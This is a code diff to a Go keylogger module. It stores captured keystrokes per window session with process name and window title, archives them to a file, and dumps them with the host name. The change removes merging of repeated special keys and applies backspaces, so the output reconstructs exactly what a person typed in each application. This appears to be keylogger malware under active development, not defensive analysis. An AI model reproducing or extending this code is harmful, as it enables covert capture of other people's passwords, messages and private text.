@@ -21,17 +21,9 @@ type KeylogBuffer struct {
 	mu       sync.Mutex
 	sessions []*win32.WindowSession
 	current  *win32.WindowSession
-	repeat   repeatState
 }
 
-type repeatState struct {
-	label string
-	at    time.Time
-	count int
-	index int
-}
-
-const repeatWindow = 250 * time.Millisecond
+const keyBackspace = 0x08
 
 var globalBuffer = &KeylogBuffer{}
 
@@ -51,7 +43,6 @@ func (b *KeylogBuffer) StartSession(process, title string, at time.Time) {
 		ProcessName: process,
 		WindowTitle: title,
 	}
-	b.repeat = repeatState{index: -1}
 }
 
 func (b *KeylogBuffer) Append(event win32.KeyEvent) {
@@ -64,43 +55,8 @@ func (b *KeylogBuffer) Append(event win32.KeyEvent) {
 			ProcessName: "desconocido",
 			WindowTitle: "",
 		}
-		b.repeat = repeatState{index: -1}
 	}
-
-	if event.IsSpecial && b.collapseLocked(event) {
-		return
-	}
-
 	b.current.Events = append(b.current.Events, event)
-	if event.IsSpecial {
-		b.repeat = repeatState{
-			label: event.Label,
-			at:    event.Timestamp,
-			count: 1,
-			index: len(b.current.Events) - 1,
-		}
-		return
-	}
-	b.repeat = repeatState{index: -1}
-}
-
-func (b *KeylogBuffer) collapseLocked(event win32.KeyEvent) bool {
-	state := b.repeat
-	if state.index < 0 || state.label != event.Label {
-		return false
-	}
-	if event.Timestamp.Sub(state.at) > repeatWindow {
-		return false
-	}
-	if state.index >= len(b.current.Events) {
-		return false
-	}
-
-	state.count++
-	state.at = event.Timestamp
-	b.current.Events[state.index].Label = fmt.Sprintf("%sx%d", state.label, state.count)
-	b.repeat = state
-	return true
 }
 
 func (b *KeylogBuffer) closeLocked() {
@@ -113,7 +69,8 @@ func (b *KeylogBuffer) closeLocked() {
 }
 
 func (b *KeylogBuffer) appendArchiveLocked(session *win32.WindowSession) {
-	if len(session.Events) == 0 {
+	block := formatSession(session)
+	if block == "" {
 		return
 	}
 	path := keylogArchivePath()
@@ -128,7 +85,7 @@ func (b *KeylogBuffer) appendArchiveLocked(session *win32.WindowSession) {
 		return
 	}
 	defer func() { _ = file.Close() }()
-	_, _ = file.WriteString(formatSession(session) + "\n")
+	_, _ = file.WriteString(block + "\n")
 }
 
 func keylogArchivePath() string {
@@ -148,13 +105,14 @@ func (b *KeylogBuffer) FormatDump() string {
 
 	var out strings.Builder
 	for _, session := range ordered {
-		if len(session.Events) == 0 {
+		block := formatSession(session)
+		if block == "" {
 			continue
 		}
 		if out.Len() > 0 {
 			out.WriteByte('\n')
 		}
-		out.WriteString(formatSession(session))
+		out.WriteString(block)
 	}
 	return out.String()
 }
@@ -164,28 +122,31 @@ func formatSession(session *win32.WindowSession) string {
 	if process == "" {
 		process = "desconocido"
 	}
-	title := strings.ReplaceAll(session.WindowTitle, "\n", " ")
+	title := strings.Join(strings.Fields(session.WindowTitle), " ")
 
-	var out strings.Builder
-	fmt.Fprintf(&out, "[%s UTC] %s — \"%s\"\n",
-		session.StartedAt.UTC().Format("2006-01-02 15:04:05"), process, title)
-
+	text := make([]rune, 0, len(session.Events))
 	for _, event := range session.Events {
 		if event.IsSpecial {
-			out.WriteString(event.Label)
-			if event.Label == "[ENTER]" {
-				out.WriteByte('\n')
+			if event.Vk == keyBackspace && len(text) > 0 {
+				text = text[:len(text)-1]
 			}
 			continue
 		}
-		out.WriteRune(event.Rune)
+		text = append(text, event.Rune)
+	}
+	if len(text) == 0 {
+		return ""
 	}
 
-	text := out.String()
-	if !strings.HasSuffix(text, "\n") {
-		text += "\n"
+	var out strings.Builder
+	fmt.Fprintf(&out, "[%s | %s | %s UTC]\n",
+		process, title, session.StartedAt.UTC().Format("2006-01-02 15:04:05"))
+	out.WriteString(string(text))
+	block := out.String()
+	if !strings.HasSuffix(block, "\n") {
+		block += "\n"
 	}
-	return text
+	return block
 }
 
 func (b *KeylogBuffer) DumpToFile() ([]byte, string) {
@@ -199,7 +160,6 @@ func (b *KeylogBuffer) ClearBuffer() {
 	b.closeLocked()
 	b.sessions = nil
 	b.current = nil
-	b.repeat = repeatState{index: -1}
 }
 
 func safeHostname() string {
@@ -239,7 +199,6 @@ func (b *KeylogBuffer) FlushCurrent() {
 	b.mu.Lock()
 	defer b.mu.Unlock()
 	b.closeLocked()
-	b.repeat = repeatState{index: -1}
 }
 
 func (b *KeylogBuffer) sessionCount() int {
